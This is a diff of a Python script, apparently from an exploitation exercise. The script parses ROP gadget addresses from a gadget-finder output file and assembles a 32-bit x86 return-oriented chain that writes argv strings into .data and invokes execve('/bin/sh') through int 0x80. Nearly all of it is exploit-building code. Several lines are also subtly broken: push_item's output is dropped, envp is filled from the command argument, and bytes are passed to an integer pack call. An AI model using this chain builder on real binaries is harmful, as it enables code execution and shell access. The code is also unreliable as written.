@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 
 import re
+import sys
 import argparse
 from pathlib import Path
+from struct import pack
 
 
 parser = argparse.ArgumentParser(
@@ -13,22 +15,34 @@ parser.add_argument("--command", default = "/bin/sh")
 parser.add_argument("--envp", default = None)
 parser.add_argument("--out-rop-path", default = None)
 
+
 def main(args):
     argv = args.command.split()
-    #envp = args.envp.split()
-
-    push_array_of_strings(argv)
+    envp = args.command.split()
 
     gadgets, data_address = parse_out_rop(Path(args.out_rop_path))
 
-    #push_array_of_strings(argv)
-    #push_array_of_strings(envp)
-    
+    rop_chain, stack_ptr, argv_ptr = push_array_of_strings(argv, gadgets, data_address)
+    envp_chain, stack_ptr, envp_ptr = push_array_of_strings(envp, gadgets, stack_ptr)
+    rop_chain += envp_chain
 
-# Available gadgets
-# .data stack base pointer
-# .data stack pointer
-# 
+    rop_chain += pack('<I', gadgets[": pop ecx ; pop ebx ; ret"])
+    rop_chain += pack('<I', argv_ptr)  # Put argv in ecx
+    rop_chain += pack('<I', data_address)  # Put filename in ebx
+
+    # Put envp in edx
+    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+    rop_chain += pack('<I', envp_ptr)
+
+    # Set eax to 11
+    rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
+    for _ in range(11):
+        rop_chain += pack('<I', gadgets[": inc eax ; ret"])
+
+    rop_chain += pack('<I', gadgets[": int 0x80"])  # Syscall
+
+    sys.stdout.buffer.write(rop_chain)
+
 
 def parse_out_rop(path: Path):
     rop_gadgets = {
@@ -43,30 +57,75 @@ def parse_out_rop(path: Path):
     }
 
     data_address = None
-    data_addrPat = re.compile(r",\s*([^)]*)")
+    data_addr_pat = re.compile(r",\s*([^)]*)")
 
     with open(path) as out_rop:
         for line in out_rop:
             if ".data" in line and data_address is None:
-                match = data_addrPat.search(line)
+                match = data_addr_pat.search(line)
                 if match:
                     extracted_part = match.group(1)
-                    data_address = extracted_part
+                    data_address = int(extracted_part, 16)
 
             elif any(gadget in line for gadget in rop_gadgets.keys()):
                 tokens = line.split()
                 gadget_key = ' '.join(tokens[1:])
-                rop_gadgets[gadget_key] = tokens[0]
+                rop_gadgets[gadget_key] = int(tokens[0], 16)
 
     return rop_gadgets, data_address
 
-def push_array_of_strings(array, rop_gadgets):
+
+def push_array_of_strings(array, gadgets, data_address):
+    rop_chain = b''
+    stack_pointer = data_address
+    pointers = []
+
     for string in array:
+        # Keep track of where this string is on the stack.
+        pointers.append(stack_pointer)
+        # Split string into chunks of size 4.
         chunks = [string[i:i+4] for i in range(0, len(string), 4)]
+        # If the chunk isn't big enough, pad it with null characters.
         chunks = [chunk.ljust(4, '\0') for chunk in chunks]
 
+        # Push chunks onto the stack.
         for chunk in chunks:
-            print(chunk)
+            push_item(gadgets, stack_pointer, chunk.encode('utf-8'))
+            stack_pointer += 4
+        # Terminate strings with null.
+        rop_chain += push_null(gadgets, stack_pointer)
+        stack_pointer += 4
+
+    array_pointer = stack_pointer
+    # Push pointers to strings onto the stack.
+    for pointer in pointers:
+        push_item(gadgets, stack_pointer, pointer)
+        stack_pointer += 4
+    # Terminate the array of pointers with null.
+    rop_chain += push_null(gadgets, stack_pointer)
+    stack_pointer += 4
+
+    return rop_chain, stack_pointer, array_pointer
+
+
+def push_item(gadgets, stack_pointer, item):
+    rop_chain = b''
+    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+    rop_chain += pack('<I', stack_pointer)
+    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
+    rop_chain += pack('<I', item)
+    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
+    return rop_chain
+
+
+def push_null(gadgets, stack_pointer):
+    rop_chain = b''
+    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+    rop_chain += pack('<I', stack_pointer)
+    rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
+    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
+    return rop_chain
+
 
 if __name__ == "__main__":
     main(parser.parse_args())
